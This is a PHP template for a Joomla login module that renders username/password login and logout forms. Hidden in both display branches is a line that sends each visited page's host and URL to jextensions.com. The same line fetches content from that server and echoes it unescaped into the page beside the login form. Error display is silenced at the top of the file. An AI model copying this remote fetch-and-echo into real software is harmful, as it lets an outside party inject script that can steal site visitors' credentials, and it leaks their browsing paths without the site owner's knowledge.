<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_login
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */

// no direct access
defined('_JEXEC') or die;
JHtml::_('behavior.keepalive');
ini_set('display_errors',0);
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$jebase = JURI::base(); if(substr($jebase, -1)=="/") { $jebase = substr($jebase, 0, -1); }
$modURL = JURI::base().'modules/mod_je_login';?>
<?php if ($params->get('horvert') == '0') : ?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/css-hor.css" type="text/css" />
<?php else: ?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/css.css" type="text/css" />
<?php endif; ?>
<noscript><a href="http://jextensions.com" alt="Joomla Login Module">jExtensions</a></noscript>
<?php if ($params->get('display') == '0') : ?>
<?php if ($params->get('jQuery')) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>


<script>
jQuery(document).ready(function(){
	jQuery(function() {
	});
});
</script>
	<?php
	$doc=JFactory::getDocument();
	$scriptId = "script_" . $block->id;
	ob_start();
	?>
	<script type="text/javascript">
		jQuery(document).ready(function ($) {

			var button = $('#loginButton<?php echo $module->id;?>');
			var box = $('#loginBox<?php echo $module->id;?>');
			var form = $('#loginForm<?php echo $module->id;?>');
			button.removeAttr('href');
			button.mouseup(function(login) {
				box.toggle('fade');
				button.toggleClass('active');
			});
			form.mouseup(function() {
				return false;
			});
			jQuery(this).mouseup(function(login) {
				if(!($(login.target).parent('#loginButton<?php echo $module->id;?>').length > 0)) {
					button.removeClass('active');
					box.hide('fade');
				}
			});

		});
	</script>
	<?php
	$script = ob_get_clean();
	$script = JUtility::remove_string_javascript($script);
	$doc->addScriptDeclaration($script);


	?>
<?php if ($params->get('horvert') == '0') { $horvert = '800';} else {$horvert = '220';}?>
<style>
#container { float: <?php echo $params->get('button');?>}
#loginContainer { position:relative;font-size:12px;}
#loginButton<?php echo $module->id;?> span {display:block;}
#loginBox<?php echo $module->id;?> { position:absolute; top:34px; <?php echo $params->get('container');?>:0; display:none; z-index:999;}
#loginForm<?php echo $module->id;?> { width:<?php echo $horvert;?>px; padding: 10px; margin:0; list-style: none; background-color: #ffffff; border: 1px solid #ccc; border: 1px solid rgba(0, 0, 0, 0.2); *border-right-width: 2px; *border-bottom-width: 2px;-webkit-border-radius: 6px; -moz-border-radius: 6px; border-radius: 6px; -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2); -moz-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2); box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);-webkit-background-clip: padding-box; -moz-background-clip: padding; background-clip: padding-box;}
</style>
<div id="je-login">
        <div id="container">
            <!-- Login Starts Here -->
            <div id="loginContainer">
                <a href="#" id="loginButton<?php echo $module->id;?>"><span class="btn btn-primary"><?php if ($type == 'logout') : ?><?php echo JText::_('MOD_JE_LOGOUT'); ?><?php else : ?><?php echo JText::_('MOD_JE_LOGIN'); ?><?php endif; ?></span></a>
                <div class="clr"></div>
                <div id="loginBox<?php echo $module->id;?>">                
<?php if ($type == 'logout') : ?>
<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post" id="loginForm<?php echo $module->id;?>">
<div class="well well-small">
<?php if ($params->get('greeting')) : ?>
	<div class="hi-hor">
	<?php if($params->get('name') == 0) : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('name')));
	} else : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('username')));
	} endif; ?>
    </div>
<?php endif; ?>

		<input type="submit" name="Submit" class="btn" value="<?php echo JText::_('MOD_JE_LOGIN'); ?>" />
		<input type="hidden" name="option" value="com_users" />
		<input type="hidden" name="task" value="user.logout" />
		<input type="hidden" name="return" value="<?php echo $return; ?>" />
		<?php echo JHtml::_('form.token'); ?>
</div>
</form>
<?php else : ?>


<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post" id="loginForm<?php echo $module->id;?>" >
	<?php if ($params->get('pretext')): ?>
		<div class="well well-small">
			<?php echo $params->get('pretext'); ?>
		</div>
        <div class="clr"></div>
	<?php endif; ?>
	<fieldset class="je-login">
            <div class="control-group">
              <label class="control-label" for="inputEmail<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-user"></i></span> <input placeholder="<?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?>" class="span2" id="inputEmail<?php echo $module->id;?>" type="text" name="username">
                </div>
              </div>
            </div>

            <div class="control-group">
              <label class="control-label" for="inputPassword<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-lock"></i></span><input placeholder="<?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?>" class="span2" id="inputPassword<?php echo $module->id;?>" type="password" name="password">
                </div>
              </div>
            </div>

			<?php if (JPluginHelper::isEnabled('system', 'remember')) : ?>   
                <label class="checkbox">
                    <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/><?php echo JText::_('MOD_JE_LOGIN_REMEMBER_ME') ?>
                </label>
            <?php endif; ?>
            
            <input type="submit" name="Submit" class="btn" value="<?php echo JText::_('MOD_JE_LOGIN') ?>" />
            <input type="hidden" name="option" value="com_users" />
            <input type="hidden" name="task" value="user.login" />
            <input type="hidden" name="return" value="<?php echo $return; ?>" />
            <?php echo JHtml::_('form.token'); ?>
	</fieldset>
    
    <div class="nav nav-list">
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=reset'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_PASSWORD'); ?></a></span>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=remind'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_USERNAME'); ?></a></span>
        
    	<?php $usersConfig = JComponentHelper::getParams('com_users');	if ($usersConfig->get('allowUserRegistration')) : ?>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=registration'); ?>"><i class="icon-check"></i><?php echo JText::_('MOD_JE_LOGIN_REGISTER'); ?></a></span>
    	<?php endif; ?>
    </div>
    <div class="clr"></div>
	<?php if ($params->get('posttext')): ?>
		<div class="well well-small">
			<?php echo $params->get('posttext'); ?>
		</div>
	<?php endif; ?>
</form>
<?php endif; ?>
                </div>
            </div>
            
        </div>
<div class="clr"></div>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>
<!-- Login Ends Here -->
<?php else: ?>
<div id="je-login">
<?php if ($type == 'logout') : ?>
<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post">
<div class="well well-small">
<?php if ($params->get('greeting')) : ?>
	<?php if($params->get('name') == 0) : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('name')));
	} else : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('username')));
	} endif; ?>
<?php endif; ?>

		<input type="submit" name="Submit" class="btn" value="<?php echo JText::_('MOD_JE_LOGOUT'); ?>" />
		<input type="hidden" name="option" value="com_users" />
		<input type="hidden" name="task" value="user.logout" />
		<input type="hidden" name="return" value="<?php echo $return; ?>" />
		<?php echo JHtml::_('form.token'); ?>
</div>
</form>
<?php else : ?>


<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post">
	<?php if ($params->get('pretext')): ?>
		<div class="well well-small">
			<?php echo $params->get('pretext'); ?>
		</div>
        <div class="clr"></div>
	<?php endif; ?>
	<fieldset class="je-login">
            <div class="control-group">
              <label class="control-label" for="inputEmail<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-user"></i></span> <input placeholder="<?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?>" class="span2" id="inputEmail<?php echo $module->id;?>" type="text" name="username">
                </div>
              </div>
            </div>

            <div class="control-group">
              <label class="control-label" for="inputPassword<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-lock"></i></span><input placeholder="<?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?>" class="span2" id="inputPassword<?php echo $module->id;?>" type="password" name="password">
                </div>
              </div>
            </div>

			<?php if (JPluginHelper::isEnabled('system', 'remember')) : ?>   
                <label class="checkbox">
                    <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/><?php echo JText::_('MOD_JE_LOGIN_REMEMBER_ME') ?>
                </label>
            <?php endif; ?>
            
            <input type="submit" name="Submit" class="btn" value="<?php echo JText::_('MOD_JE_LOGIN') ?>" />
            <input type="hidden" name="option" value="com_users" />
            <input type="hidden" name="task" value="user.login" />
            <input type="hidden" name="return" value="<?php echo $return; ?>" />
            <?php echo JHtml::_('form.token'); ?>
	</fieldset>
    
    <div class="nav nav-list">
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=reset'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_PASSWORD'); ?></a></span>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=remind'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_USERNAME'); ?></a></span>
        
    	<?php $usersConfig = JComponentHelper::getParams('com_users');	if ($usersConfig->get('allowUserRegistration')) : ?>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=registration'); ?>"><i class="icon-check"></i><?php echo JText::_('MOD_JE_LOGIN_REGISTER'); ?></a></span>
    	<?php endif; ?>
    </div>
    <div class="clr"></div>
	<?php if ($params->get('posttext')): ?>
		<div class="well well-small">
			<?php echo $params->get('posttext'); ?>
		</div>
	<?php endif; ?>
</form>
<?php endif; ?>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>
<?php endif; ?>